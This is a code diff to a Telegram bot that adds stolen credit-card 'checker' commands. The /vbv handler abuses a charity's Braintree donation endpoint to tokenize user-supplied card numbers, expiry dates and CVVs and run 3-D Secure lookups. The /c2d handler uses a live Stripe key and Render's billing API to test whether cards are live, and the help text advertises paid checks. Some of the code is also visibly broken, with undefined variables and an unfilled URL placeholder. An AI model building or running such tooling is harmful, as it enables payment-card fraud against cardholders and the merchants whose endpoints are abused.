@@ -7,6 +7,12 @@ import random
 import yaml
 import asyncio
 import re
+import base64
+from bs4 import BeautifulSoup
+from lxml import html
+from lxml import etree 
+from telegram import Update
+from telegram.ext import Updater, CommandHandler, CallbackContext
 
 from aiogram import Bot, Dispatcher, executor, types
 from aiogram.utils.exceptions import Throttled
@@ -65,13 +71,13 @@ async def is_owner(user_id):
 async def helpstr(message: types.Message):
     # await message.answer_chat_action('typing')
     keyboard_markup = types.InlineKeyboardMarkup(row_width=3)
-    btns = types.InlineKeyboardButton("Bot Source", url="viet69.in")
+    btns = types.InlineKeyboardButton("Bot Source", url="https://viet69.vc/")
     keyboard_markup.row(btns)
     FIRST = message.from_user.first_name
     MSG = f'''
-Hello {FIRST}, Im {BOT_NAME}
-U can find my Boss  <a href="tg://user?id={OWNER}">HERE</a>
-Cmds \n/ck Charge 0.8$ \n/bin \n/cv Check Auth'''
+Hello {FIRST}, I'm bot
+BOSS:  <a href="tg://user?id={OWNER}">HERE</a>
+Cmds \n/ck Charge 0.8$ \n/bin \n/cv 4.99$'''
     await message.answer(MSG, reply_markup=keyboard_markup,
                         disable_web_page_preview=True)
 
@@ -791,6 +797,543 @@ async def ch(message: types.Message):
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
+@dp.message_handler(commands=['vbv'], commands_prefix=PREFIX)
+async def ch(message: types.Message):
+    await message.answer_chat_action('typing')
+    tic = time.perf_counter()
+    ID = message.from_user.id
+    FIRST = message.from_user.first_name
+    try:
+        await dp.throttle('cv', rate=ANTISPAM)
+    except Throttled:
+        await message.reply('<b>Too many requests!</b>\n'
+                            f'Blocked For {ANTISPAM} seconds')
+    else:
+        if message.reply_to_message:
+            cc = message.reply_to_message.text
+        else:
+            cc = message.text[len('/cv '):]
 
+        if len(cc) == 0:
+            return await message.reply("<b>No Card to cv</b>")
+
+        x = re.findall(r'\d+', cc)
+        ccn = x[0]
+        mm = x[1]
+        yy = x[2]
+        cvv = x[3]
+        if mm.startswith('2'):
+            mm, yy = yy, mm
+        if len(mm) >= 3:
+            mm, yy, cvv = yy, cvv, mm
+        if len(ccn) < 15 or len(ccn) > 16:
+            return await message.reply('<b>Failed to parse Card</b>\n'
+                                       '<b>Reason: Invalid Format!</b>')   
+        BIN = ccn[:6]
+        if BIN in BLACKLISTED:
+            return await message.reply('<b>BLACKLISTED BIN</b>')
+    
+        headers = {
+            "user-agent": UA,
+            "accept": "application/json, text/plain, */*",
+            "content-type": "application/x-www-form-urlencoded"
+        }
+
+        b = session.get('https://ip.seeip.org/').text
+         # get guid muid sid
+        headers = {
+            "user-agent": UA,
+            "accept": "application/json, text/plain, */*",
+            "content-type": "application/x-www-form-urlencoded"
+        }
+
+        b = session.get('https://ip.seeip.org/').text
+
+        s = session.post('https://m.stripe.com/6', headers=headers)
+        r = s.json()
+        Guid = r['guid']
+        Muid = r['muid']
+        Sid = r['sid']
+
+        LastF = f'************{ccn[-4:]}'
+
+  
+        head = {
+            "user-agent": UA,
+            "accept": "application/json, text/plain, */*",
+            "content-type": "application/x-www-form-urlencoded"
+        }
+
+        r2 = session.post('https://charliewaller.org/umbraco/BraintreeDonation/BraintreeDonationSurface/ClientToken',
+                          headers=head)
+        clientToken1 = r2.json()['clientToken']  
+        clientToken = base64.b64decode(clientToken)
+        bearer = clientToken.json()['authorizationFingerprint']              
+        toc = time.perf_counter()
+
+        payload2 = { "clientSdkMetadata": {"source":"client", "integration":"dropin2","sessionId":"{Guid}"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!){   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"{ccn}","expirationMonth":"{mm}","expirationYear":"{yy}","cvv":"{cvv}","cardholderName":"{First} {Last}"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}
+            
+            
+        
+ 
+        head2 = {
+            "user-agent": UA,
+            "accept": "application/json, text/plain, */*",
+            "content-type": "application/x-www-form-urlencoded"
+        }
+
+        r3 = session.post('https://payments.braintree-api.com/graphql', data=payload2,
+                          headers=head2)
+        tokenizeCreditCard = r3.json()['data']['tokenizeCreditCard']  
+        token1 = tokenizeCreditCard['token']
+        bin = tokenizeCreditCard['creditCard']['bin']
+        brand = tokenizeCreditCard['creditCard']['brandCode']
+        bindata =  tokenizeCreditCard['creditCard']['binData']
+        bank = bindata['issuingBank']
+        country = bindata['countryOfIssuance']
+
+
+
+        payload3 = {"amount":"1",
+         "additionalInfo":{"acsWindowSize":"03"},
+         "bin":"{bin}",
+         "dfReferenceId":"1_f802e5f3-2dc6-4b6d-a28b-2d98b0ebcaf3",
+         "clientMetadata":{"requestedThreeDSecureVersion":"2",
+         "sdkVersion":"web/3.58.0",
+         "cardinalDeviceDataCollectionTimeElapsed":842,
+         "issuerDeviceDataCollectionTimeElapsed":602,
+         "issuerDeviceDataCollectionResult":true},
+         "authorizationFingerprint":"{bearer}",
+         "braintreeLibraryVersion":"braintree/web/3.58.0",
+         "_meta":{"merchantAppId":"charliewaller.org",
+         "platform":"web",
+         "sdkVersion":"3.58.0",
+         "source":"client",
+         "integration":"custom",
+         "integrationType":"custom",
+         "sessionId":Guid}
+                   }
+        
+ 
+        head3 = {
+            "user-agent": UA,
+            "accept": "application/json, text/plain, */*",
+            "content-type": "application/x-www-form-urlencoded",
+            "accept-Language": "en-GB,en;q=0.9,en-US;q=0.8",
+            "host": "api.braintreegateway.com",
+            "origin": "https://charliewaller.org",
+            "referer": "https://charliewaller.org/"
+        }
+
+        r4 = session.post('https://api.braintreegateway.com/merchants/zhqjdd67457jvj8k/client_api/v1/payment_methods/<tokencc>/three_d_secure/lookup', data=payload2,
+                          headers=head3)
+        threeDSecureInfo = r4.json()['paymentMethod']['threeDSecureInfo']
+        status = threeDSecureInfo['status']
+
+        if 'bypassed' in r4.text:
+            return await message.reply(f'''
+<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ ✅NON VBV B3✅
+<b>MSG</b>➟ {status}
+
+𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
+
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+        if 'authenticate_attempt_successful' in r4.text:
+            return await message.reply(f'''
+<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ ✅NON VBV B3✅
+<b>MSG</b>➟ {status}
+
+𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
+
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+        if 'authenticate_successful' in r4.text:
+            return await message.reply(f'''
+<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ ✅NON VBV B3✅
+<b>MSG</b>➟ {status}
+
+𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
+
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+        if 'lookup_not_enrolled' in r4.text:
+            return await message.reply(f'''
+<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ ✅NON VBV B3✅
+<b>MSG</b>➟ {status}
+
+𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
+
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+        if 'authentication_unavailable' in r4.text:
+            return await message.reply(f'''
+<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ ✅NON VBV B3✅
+<b>MSG</b>➟ {status}
+
+𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
+
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>BOT</b>: @{BOT_USERNAME}''') 
+    
+        if 'lookup_enrolled' in r4.text:
+            return await message.reply(f'''
+<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ ❌VBV❌
+<b>MSG</b>➟ {status}
+
+𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
+
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>BOT</b>: @{BOT_USERNAME}''')
+ 
+        if 'failed' in r4.text:
+            return await message.reply(f'''
+<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ ❌VBV❌
+<b>MSG</b>➟ {status}
+
+𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
+
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+        if 'error' in r4.text:
+            return await message.reply(f'''
+<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ ❌VBV❌
+<b>MSG</b>➟ {status}
+
+𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
+
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+        if 'authenticate_successful_issuer_not_participating' in r4.text:
+            return await message.reply(f'''
+<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ ❌VBV❌
+<b>MSG</b>➟ {status}
+
+𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
+
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+        if 'data_only_successful' in r4.text:
+            return await message.reply(f'''
+<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ ❌VBV❌
+<b>MSG</b>➟ {status}
+
+𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
+
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>BOT</b>: @{BOT_USERNAME}''')
+ 
+        if 'authenticate_unable_to_authenticate' in r4.text:
+            return await message.reply(f'''
+<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ ❌VBV❌
+<b>MSG</b>➟ {status}
+
+𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
+
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+        if 'unsupported' in r4.text:
+            return await message.reply(f'''
+<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ ❌VBV❌
+<b>MSG</b>➟ {status}
+
+𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
+
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>BOT</b>: @{BOT_USERNAME}''')
+ 
+        if 'challenge_required' in r4.text:
+            return await message.reply(f'''
+<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ ❌VBV❌
+<b>MSG</b>➟ {status}
+
+𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {bank}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
+
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+@dp.message_handler(commands=['c2d'], commands_prefix=PREFIX)
+async def ch(message: types.Message):
+    await message.answer_chat_action('typing')
+    tic = time.perf_counter()
+    ID = message.from_user.id
+    FIRST = message.from_user.first_name
+    try:
+        await dp.throttle('cv', rate=ANTISPAM)
+    except Throttled:
+        await message.reply('<b>Too many requests!</b>\n'
+                            f'Blocked For {ANTISPAM} seconds')
+    else:
+        if message.reply_to_message:
+            cc = message.reply_to_message.text
+        else:
+            cc = message.text[len('/cv '):]
+
+        if len(cc) == 0:
+            return await message.reply("<b>No Card to cv</b>")
+
+        x = re.findall(r'\d+', cc)
+        ccn = x[0]
+        mm = x[1]
+        yy = x[2]
+        cvv = x[3]
+        if mm.startswith('2'):
+            mm, yy = yy, mm
+        if len(mm) >= 3:
+            mm, yy, cvv = yy, cvv, mm
+        if len(ccn) < 15 or len(ccn) > 16:
+            return await message.reply('<b>Failed to parse Card</b>\n'
+                                       '<b>Reason: Invalid Format!</b>')   
+        BIN = ccn[:6]
+        if BIN in BLACKLISTED:
+            return await message.reply('<b>BLACKLISTED BIN</b>')
+        # get guid muid sid
+        headers = {
+            "user-agent": UA,
+            "accept": "application/json, text/plain, */*",
+            "content-type": "application/x-www-form-urlencoded"
+        }
+
+        b = session.get('https://ip.seeip.org/').text
+
+        s = session.post('https://m.stripe.com/6', headers=headers)
+        r = s.json()
+        Guid = r['guid']
+        Muid = r['muid']
+        Sid = r['sid']
+
+        # hmm
+        load = {
+            "guid": Guid,
+            "muid": Muid,
+            "sid": Sid,
+            "key": "pk_live_Jv30CQQpAQyWO9FMp3i5IPOt",
+            "card[name]": Name,
+            "card[number]": ccn,
+            "card[exp_month]": mm,
+            "card[exp_year]": yy,
+            "card[cvc]": cvv
+        }
+
+        header = {
+            "accept": "application/json",
+            "content-type": "application/x-www-form-urlencoded",
+            "user-agent": UA,
+            "origin": "https://js.stripe.com",
+            "referer": "https://js.stripe.com/",
+            "accept-language": "en-US,en;q=0.9"
+            
+        }
+
+        rx = session.post('https://api.stripe.com/v1/tokens',
+                          data=load, headers=header)
+        res = rx.json()   
+        toc1 = time.perf_counter()
+       
+        
+        LastF = f'************{ccn[-4:]}'
+
+        if 'declined' in rx.text:
+            
+            msg = res['error']['message']
+            return await message.reply(f'''
+❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ Declined
+<b>MSG</b>➟ {msg}
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc1 - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+
+<b>BOT</b>: @{BOT_USERNAME}''')
+        if 'incorrect_number' in rx.text:
+            res = rx.json()
+            msg = res['error']['message']
+            return await message.reply(f'''
+❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ Incorrect_number
+<b>MSG</b>➟ Your card number is incorrect.
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc1 - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>BOT</b>: @{BOT_USERNAME}''')
+        if 'Request rate limit exceeded.' in rx.text:
+            res = rx.json()
+            msg = res['error']['message']
+            return await message.reply(f'''
+❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ Request rate limit exceeded.
+<b>MSG</b>➟ {msg}
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc1 - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+        if 'API Key provided' in rx.text:
+            res = rx.json()
+            msg = res['error'][0]['message']
+            return await message.reply(f'''
+❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ API Key provided
+<b>MSG</b>➟ {msg}
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc1 - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>BOT</b>: @{BOT_USERNAME}''')
+        if 'security code is invalid' in rx.text:
+            res = rx.json()
+            msg = res['error']['message']
+            return await message.reply(f'''
+❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ Security code is invalid.
+<b>MSG</b>➟ {msg}
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc1 - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+        else: 
+          token =res['id']
+          card = res['card']
+          country = card['country']
+          brand = card['brand']
+          funding = card['funding']
+
+          payload = {"operationName":"updateCard","variables":{"id":"usr-cboij3n9re0t6g5u4h30","token":"{token}","brand":"{brand}","last4":"{LastF}","country":"US","region":"NY"},"query":"mutation updateCard($id: String!, $token: String!, $brand: String!, $last4: String!, $country: String!, $region: String!) {\n  updateCard(\n    id: $id\n    token: $token\n    brand: $brand\n    last4: $last4\n    country: $country\n    region: $region\n  ) {\n    ...ownerFields\n    ...ownerBillingFields\n    __typename\n  }\n}\n\nfragment ownerBillingFields on Owner {\n  cardBrand\n  cardLast4\n  __typename\n}\n\nfragment ownerFields on Owner {\n  id\n  billingStatus\n  email\n  featureFlags\n  notEligibleFeatureFlags\n  notifyOnFail\n  slackConnected\n  logEndpoint {\n    endpoint\n    token\n    updatedAt\n    __typename\n  }\n  __typename\n}\n"}
+
+          head = {
+            "accept": "*/*",
+            "content-type": "application/json",
+            "user-agent": UA,
+            "origin": "https://dashboard.render.com",
+            "referer": "https://dashboard.render.com/select-repo?type=pserv",
+            "render-request-id": "{Guid}",
+            "accept-language": "en-US,en;q=0.9"
+           
+            
+        }
+
+          ri = requests.post('https://api.render.com/graphql', data=payload,
+                          headers=head)
+          res1 = ri.json() 
+
+          toc = time.perf_counter()
+
+          if 'success' in ri.text:
+            return await message.reply(f'''
+✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ #ApprovedCVV
+<b>MSG</b>➟ {ri.text}
+
+𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
+
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+          if 'incorrect_cvc' in ri.text:
+            return await message.reply(f'''
+✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ #ApprovedCCN
+<b>MSG</b>➟ {ri.text}
+
+𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
+
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+          if 'errors' in ri.text:
+            msg = res['errors'][0]['message']
+            #msg = res['errors']['message']
+            
+            return await message.reply(f'''
+❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>MSG</b>➟ {msg}
+
+𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
+
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+          await message.reply(f'''
+❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ DEAD
+<b>MSG</b>➟ {ri.text}
+
+𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
+
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>BOT</b>: @{BOT_USERNAME}''')          
+          
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True, loop=loop)
